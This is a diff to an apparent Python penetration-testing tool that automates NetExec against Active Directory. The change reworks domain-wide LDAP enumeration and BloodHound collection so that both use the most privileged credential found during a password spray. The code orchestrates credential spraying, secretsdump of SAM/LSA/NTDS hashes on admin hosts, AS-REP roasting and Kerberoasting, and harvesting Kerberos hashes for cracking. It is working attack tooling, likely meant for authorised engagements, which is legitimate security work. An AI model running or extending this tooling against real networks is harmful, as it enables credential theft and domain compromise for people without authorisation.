@@ -1315,20 +1315,75 @@ class NxcAutomator:
         return ranked[0]
 
     def _post_exploit_host(self, host: str, host_valid: list[dict]):
-        """Run SMB enum/modules/secretsdump and LDAP enum on the best creds
-        we have for this host."""
+        """Run SMB-side post-exploit (enum/modules/secretsdump) on the best
+        SMB cred for this single host. LDAP enum is intentionally NOT done
+        here — it's a domain-wide concern and runs once at end-of-run via
+        _run_ldap_enum_pass() with the most-privileged cred across the
+        entire engagement (see `nxa --bloodhound` workflow)."""
         if not (self.enum_enabled or self.modules or self.secretsdump):
             return
 
         smb_target = self._pick_best_cred([v for v in host_valid if v["protocol"] == "smb"])
-        ldap_target = self._pick_best_cred(
-            [v for v in host_valid if v["protocol"] == "ldap" and not v["local_auth"]]
-        )
-
         if smb_target:
             self._post_exploit_smb(host, smb_target)
-        if ldap_target and self.enum_enabled:
-            self._post_exploit_ldap(host, ldap_target)
+
+    def _run_ldap_enum_pass(self):
+        """End-of-run domain-wide LDAP enumeration.
+
+        For every domain we discovered during the spray:
+          1. Pick the most-privileged domain credential we found (Pwn3d!
+             wins, then domain-auth, then password over hash).
+          2. Identify the best DC IP / FQDN for the domain.
+          3. Fire --users/--admin-count/--groups/--asreproast/--kerberoasting
+             once against that DC.
+
+        This replaces the per-host LDAP enum that used to fire with whatever
+        cred happened to validate on the local host — which on a typical
+        engagement meant low-priv enumeration and missing data."""
+        if not self.enum_enabled:
+            return
+        if not self.domain_hosts:
+            return
+
+        print(f"\n{'─' * BANNER_WIDTH}")
+        print(f"  {ICON_SUBTASK} {BOLD}Domain-wide LDAP enumeration{RESET}")
+        print(f"{'─' * BANNER_WIDTH}")
+
+        for domain in self.domain_hosts:
+            cred_entry = self._pick_best_domain_cred(domain)
+            if not cred_entry:
+                print(f"  {ICON_NOOP} {domain} {DIM}no domain credential available — skipped{RESET}")
+                continue
+            cred = cred_entry["credential"]
+            is_admin = self._is_pwn3d(cred_entry["raw"])
+            cred_marker = f"{RED}{BOLD}(Pwn3d!){RESET}" if is_admin else f"{DIM}(non-admin){RESET}"
+
+            dc_ip, dc_source = self._pick_dc_for_domain(domain)
+            if not dc_ip:
+                print(f"  {ICON_NOOP} {domain} {DIM}no DC candidate identified — skipped{RESET}")
+                continue
+
+            user_display = BloodHoundRunner._strip_domain_prefix(cred.user)
+            print(f"  {ICON_SUBTASK} {BOLD}{domain}{RESET} {DIM}via {dc_ip} [{dc_source}] as{RESET} "
+                  f"{BOLD}{user_display}{RESET} {cred_marker}")
+
+            host_dir = self.loot.dir_for("domain", LootStore.safe_name(domain), "ldap")
+            for action in LDAP_ENUM_ACTIONS:
+                out = host_dir / f"{action['name']}.txt"
+                substituted = [str(out) if a == "{outfile}" else a for a in action["args"]]
+                res = self._run_nxc_action("ldap", dc_ip, cred, False, substituted, out)
+                extra = ""
+                if action["name"] in ("asreproast", "kerberoasting") and out.exists():
+                    try:
+                        extra = out.read_text(errors="replace")
+                    except OSError:
+                        pass
+                status, icon, note = self._classify_action(res, action["ok_markers"], extra)
+                self._print_action(icon, action["name"], note, out, name_width=14)
+                if status == "fail":
+                    self._record_error(f"ldap {action['name']} on {domain}: {note}")
+                if action["name"] in ("asreproast", "kerberoasting") and status == "ok":
+                    self._harvest_kerberos_hashes(dc_ip, action["name"], out)
 
     def _is_likely_dc(self, host: str) -> bool:
         """Heuristic: a host is a DC if our nmap cache shows LDAP open on it.
@@ -1378,29 +1433,6 @@ class NxcAutomator:
 
         if self.secretsdump and is_pwn3d:
             self._dump_secrets(host, cred, local, host_dir)
-
-    def _post_exploit_ldap(self, host: str, target: dict):
-        cred = target["credential"]
-        host_dir = self.loot.dir_for(LootStore.safe_name(host), "ldap", "domain")
-        print(f"\n  {ICON_SUBTASK} enum {host} {DIM}(LDAP domain as {cred.user or '<empty>'}){RESET}")
-        for action in LDAP_ENUM_ACTIONS:
-            out = host_dir / f"{action['name']}.txt"
-            substituted = [str(out) if a == "{outfile}" else a for a in action["args"]]
-            res = self._run_nxc_action("ldap", host, cred, False, substituted, out)
-            # For asreproast/kerberoasting nxc writes to the file, not stdout —
-            # so we also read the file to check for the krb marker.
-            extra = ""
-            if action["name"] in ("asreproast", "kerberoasting") and out.exists():
-                try:
-                    extra = out.read_text(errors="replace")
-                except OSError:
-                    pass
-            status, icon, note = self._classify_action(res, action["ok_markers"], extra)
-            self._print_action(icon, action["name"], note, out, name_width=14)
-            if status == "fail":
-                self._record_error(f"ldap {action['name']} on {host}: {note}")
-            if action["name"] in ("asreproast", "kerberoasting") and status == "ok":
-                self._harvest_kerberos_hashes(host, action["name"], out)
 
     def _dump_secrets(self, host: str, cred: "Credential", local_auth: bool, host_dir: Path):
         """On (Pwn3d!) cred, dump SAM/LSA/NTDS hashes and grow the combo file."""
@@ -1620,19 +1652,51 @@ class NxcAutomator:
                 return hosts
         return []
 
-    def _pick_bloodhound_cred(self, domain: str) -> "Credential | None":
-        """Choose a credential that successfully authenticated against this domain."""
-        for entry in self.valid_creds:
-            host = entry["host"]
-            cred = entry["credential"]
-            if entry["local_auth"]:
-                continue
-            if self.host_domain.get(host) == domain.lower():
-                return cred
-        return None
+    def _pick_best_domain_cred(self, domain: str) -> "dict | None":
+        """Best valid cred for `domain` across the whole run, not just one host.
+        Order: (Pwn3d!) wins, then domain-auth-only (no local), then password
+        over hash. Reuses _pick_best_cred() so the ranking stays consistent
+        with the per-host post-exploit selector."""
+        domain_lc = domain.lower()
+        candidates = [
+            v for v in self.valid_creds
+            if not v["local_auth"]
+            and self.host_domain.get(v["host"]) == domain_lc
+        ]
+        if not candidates:
+            return None
+        return self._pick_best_cred(candidates)
+
+    def _pick_dc_for_domain(self, domain: str) -> tuple[str | None, str]:
+        """Return (dc_ip, source) for the best DC of `domain`.
+        Source priority: DNS SRV > SQLite cache > host that advertised it."""
+        dns_dcs = self._resolve_dc_via_dns(domain)
+        if dns_dcs:
+            if self.cache:
+                for ip in dns_dcs:
+                    self.cache.record_dc(domain, ip, "dns_srv")
+            return dns_dcs[0], "dns_srv"
+        if self.cache:
+            records = self.cache.get_dcs(domain)
+            if records:
+                return records[0][0], records[0][1]
+        hosts = self.domain_hosts.get(domain.lower())
+        if hosts:
+            return next(iter(hosts)), "smb_banner"
+        return None, ""
+
+    def _dc_fqdn_for_domain(self, domain: str, dc_ip: str) -> str | None:
+        """Return 'DC01.corp.local' if we know the NetBIOS name for `dc_ip`
+        (captured during _probe_smb_banner / _detect_dc_from_results), else None.
+        BloodHound and Kerberos both prefer FQDN for the -dc parameter."""
+        name = self.host_names.get(dc_ip)
+        if not name:
+            return None
+        return f"{name}.{domain.lower()}"
 
     def _run_bloodhound_pass(self):
-        """For every discovered domain, run bloodhound-python once (TTL-deduped)."""
+        """For every discovered domain, run bloodhound-python once (TTL-deduped),
+        using the most-privileged domain credential we found during the spray."""
         if not self.bloodhound_runner:
             return
         if not self.domain_hosts:
@@ -1640,50 +1704,41 @@ class NxcAutomator:
             return
 
         print(f"\n{'─' * BANNER_WIDTH}")
-        print(f"  {CYAN}{BOLD}🩸 BloodHound Collection{RESET}")
+        print(f"  {ICON_BLOODHOUND} {BOLD}BloodHound Collection{RESET}")
         print(f"{'─' * BANNER_WIDTH}")
 
-        for domain, hosts in self.domain_hosts.items():
+        for domain in self.domain_hosts:
             cached = self.bloodhound_runner.already_collected(domain)
             if cached:
                 ran_at = datetime.fromtimestamp(cached["ran_at"]).strftime("%Y-%m-%d %H:%M")
-                print(f"  {YELLOW}↷ {domain}{RESET} {DIM}already collected at {ran_at} → skipped{RESET}")
+                print(f"  {ICON_SKIP} {domain} {DIM}already collected at {ran_at} → skipped{RESET}")
                 print(f"     {DIM}→ {cached['output_path']}{RESET}")
                 continue
 
-            # DC candidate sources, in order of preference:
-            # 1. DNS SRV (authoritative, when dig/nslookup are available)
-            # 2. SQLite cache (DCs identified in past or current runs)
-            # 3. Hosts that just advertised this domain in nxc's SMB banner
-            dcs: list[str] = []
-            dns_dcs = self._resolve_dc_via_dns(domain)
-            if dns_dcs:
-                dcs = dns_dcs
-                self._vprint(V_VERBOSE, f"  {DIM}🩸 DNS SRV → {len(dcs)} DC(s): {', '.join(dcs)}{RESET}")
-                if self.cache:
-                    for ip in dcs:
-                        self.cache.record_dc(domain, ip, "dns_srv")
-            elif self.cache:
-                dc_records = self.cache.get_dcs(domain)
-                if dc_records:
-                    dcs = [ip for ip, _src in dc_records]
-            if not dcs:
-                dcs = list(hosts)
-
-            if not dcs:
-                print(f"  {ICON_NOOP} {domain} {DIM}no DC candidate identified — skipped{RESET}")
-                continue
-
-            cred = self._pick_bloodhound_cred(domain)
-            if not cred:
+            cred_entry = self._pick_best_domain_cred(domain)
+            if not cred_entry:
                 print(f"  {ICON_NOOP} {domain} {DIM}no domain credential available — skipped{RESET}")
                 continue
+            cred = cred_entry["credential"]
+            is_admin = self._is_pwn3d(cred_entry["raw"])
+            cred_marker = f"{RED}{BOLD}(Pwn3d!){RESET}" if is_admin else f"{DIM}(non-admin){RESET}"
 
-            dc_ip = dcs[0]
-            print(f"  {ICON_SUBTASK} {domain} {DIM}via {dc_ip} as {cred.user}{RESET}")
-            success, out_dir, err = self.bloodhound_runner.collect(domain, dc_ip, cred)
+            dc_ip, dc_source = self._pick_dc_for_domain(domain)
+            if not dc_ip:
+                print(f"  {ICON_NOOP} {domain} {DIM}no DC candidate identified — skipped{RESET}")
+                continue
+            dc_host = self._dc_fqdn_for_domain(domain, dc_ip)
+            dc_display = f"{dc_host} ({dc_ip})" if dc_host else dc_ip
+
+            user_display = BloodHoundRunner._strip_domain_prefix(cred.user)
+            print(f"  {ICON_SUBTASK} {BOLD}{domain}{RESET} {DIM}via {dc_display} [{dc_source}] as{RESET} "
+                  f"{BOLD}{user_display}{RESET} {cred_marker}")
+
+            success, out_dir, err = self.bloodhound_runner.collect(
+                domain, dc_ip, cred, dc_host=dc_host,
+            )
             self.bloodhound_results.append({
-                "domain": domain, "dc_ip": dc_ip, "auth_user": cred.user,
+                "domain": domain, "dc_ip": dc_ip, "auth_user": user_display,
                 "output_path": str(out_dir), "success": success, "error": err,
             })
             if success:
@@ -1902,6 +1957,13 @@ class NxcAutomator:
                                 else:
                                     print(f"  {GREEN}► {host_tag}{RESET} {BOLD}{label:<20}{RESET} {GREEN}{entry['raw']}{RESET}")
                         self._post_exploit_host(host, host_valid)
+
+            # Domain-wide LDAP enumeration runs after all hosts have been
+            # sprayed so we can pick the most-privileged cred we've seen.
+            # Order matters: LDAP enum first (cheap, harvests AS-REP/TGS
+            # hashes that may then get cracked), then BloodHound.
+            if self.enum_enabled:
+                self._run_ldap_enum_pass()
 
             if self.bloodhound_enabled:
                 self._run_bloodhound_pass()
